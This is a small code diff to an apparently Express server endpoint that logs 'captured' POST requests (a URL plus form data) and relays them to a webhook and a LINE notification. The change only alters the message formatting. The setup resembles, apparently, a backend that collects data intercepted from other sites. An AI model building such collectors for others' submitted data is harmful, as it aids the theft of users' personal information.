@@ -23,7 +23,7 @@ app.post('/api/jookgru', (req, res) => {
     const { url, data } = req.body;
     console.log('Captured POST request:', { url, data });
     postData.push({ url, data });
-    hook.send(JSON.stringify(postData))
+    hook.send('`',JSON.stringify(postData),'`')
     sendLineNotification(JSON.stringify(data))
     res.status(200).send('Data received successfully');
 });
